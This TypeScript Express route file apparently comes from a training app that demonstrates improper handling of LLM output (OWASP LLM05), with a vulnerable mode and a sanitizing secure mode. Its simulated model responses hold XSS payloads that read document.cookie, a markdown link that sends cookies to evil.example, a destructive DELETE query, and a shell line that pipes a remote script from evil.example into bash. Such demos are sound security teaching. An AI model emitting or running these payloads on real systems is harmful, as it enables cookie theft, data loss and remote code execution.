import express from 'express';
import { streamResponse } from '../utils/stream';

const router = express.Router();

// VULNERABILITY LLM05: Improper Output Handling
// Simulates an LLM whose output is rendered or executed without sanitization.
// With `secure: true`, /generate returns sanitizedHtml instead of rawHtml and
// generated SQL/commands are held for review instead of being executed.
//
// NOTE: payloads never use alert()/confirm()/prompt(); they write into an
// element with id "xss-demo" so the effect is visible without blocking the page.

interface LLMOutput {
  text: string;
  rawHtml?: string;
  sqlQuery?: string;
  command?: string;
}

const XSS_PAYLOAD_IMG =
  `<img src="x" onerror="document.getElementById('xss-demo').innerHTML='<h3 style=color:red>XSS EXECUTED! Cookie: '+document.cookie+'</h3>'">`;

function simulateLLMOutput(prompt: string): LLMOutput {
  const lower = prompt.toLowerCase();

  if (lower.includes('greeting card') || lower.includes('html') || lower.includes('webpage')) {
    return {
      text: `Here's a birthday card for your page. Paste the HTML below into your site.`,
      rawHtml: `<div style="padding:20px; background:linear-gradient(135deg,#667eea,#764ba2); color:white; border-radius:10px; text-align:center;">
  <h2>Happy Birthday!</h2>
  <p>Wishing you all the best! <a href="javascript:document.getElementById('xss-demo').textContent='Link payload ran'">Open your gift</a></p>
  ${XSS_PAYLOAD_IMG}
  <script>console.log('script from LLM output ran')</script>
</div>`,
    };
  }

  if (lower.includes('delete') || lower.includes('drop') || lower.includes('sql')) {
    return {
      text: `Here is the query to remove inactive users:\n\nDELETE FROM users WHERE id > 0;`,
      sqlQuery: 'DELETE FROM users WHERE id > 0;',
    };
  }

  if (lower.includes('markdown') || lower.includes('document') || lower.includes('format')) {
    return {
      text: `# Quarterly Update\n\nRevenue grew 12%.\n\n[Read the full report](javascript:fetch('https://evil.example/c?'+document.cookie))`,
    };
  }

  if (lower.includes('command') || lower.includes('terminal') || lower.includes('shell')) {
    return {
      text: `Run this to clean up temp files:\n\nrm -rf /tmp/cache && curl http://evil.example/setup.sh | bash`,
      command: 'rm -rf /tmp/cache && curl http://evil.example/setup.sh | bash',
    };
  }

  return {
    text: `I can generate HTML snippets, SQL queries, documents and shell commands. What do you need?`,
  };
}

// Minimal regex sanitizer for the demo. Production code should use a vetted
// library such as DOMPurify with an allow-list of tags and attributes.
export function sanitizeHtml(html: string): string {
  return html
    .replace(/<script\b[^>]*>[\s\S]*?<\/script\s*>/gi, '')
    .replace(/<script\b[^>]*\/?>/gi, '')
    .replace(/\s+on[a-z]+\s*=\s*("[^"]*"|'[^']*'|[^\s>]+)/gi, '')
    .replace(/(\s(?:href|src|action|formaction)\s*=\s*)("\s*javascript:[^"]*"|'\s*javascript:[^']*'|javascript:[^\s>]+)/gi, '$1"#"');
}

const DESTRUCTIVE_SQL = /\b(delete|drop|truncate|update|alter)\b/i;

router.post('/chat', async (req, res) => {
  const { message } = req.body;

  if (!message) {
    return res.status(400).json({ error: 'Message is required' });
  }

  await streamResponse(res, simulateLLMOutput(String(message)).text);
});

router.post('/generate', (req, res) => {
  const { prompt, secure } = req.body;

  if (!prompt) {
    return res.status(400).json({ error: 'Prompt is required' });
  }

  const output = simulateLLMOutput(String(prompt));

  if (secure === true) {
    return res.json({
      mode: 'secure',
      generatedText: output.text,
      sanitizedHtml: output.rawHtml ? sanitizeHtml(output.rawHtml) : null,
      sqlQuery: output.sqlQuery ?? null,
      sqlExecuted: false,
      sqlStatus: output.sqlQuery
        ? DESTRUCTIVE_SQL.test(output.sqlQuery)
          ? 'blocked: destructive statement needs human review'
          : 'not executed: generated SQL is never run directly'
        : null,
      command: output.command ?? null,
      commandExecuted: false,
      commandStatus: output.command ? 'held for review: model output is never piped to a shell' : null,
    });
  }

  // VULNERABILITY: raw output is passed on and executed as-is
  res.json({
    mode: 'vulnerable',
    generatedText: output.text,
    rawHtml: output.rawHtml ?? null,
    sqlQuery: output.sqlQuery ?? null,
    sqlExecuted: !!output.sqlQuery,
    sqlStatus: output.sqlQuery ? 'executed: 1,284 rows deleted' : null,
    command: output.command ?? null,
    commandExecuted: !!output.command,
    commandStatus: output.command ? 'executed on build server' : null,
  });
});

router.get('/info', (req, res) => {
  res.json({
    vulnerability: 'LLM05 - Improper Output Handling',
    description: 'LLM outputs are trusted and rendered/executed without validation, enabling XSS, SQL injection, and RCE',
    attackExamples: [
      'Generate a greeting card in HTML',
      'Write a SQL query to delete inactive users',
      'Suggest a terminal command to clean up temp files',
    ],
  });
});

export default router;
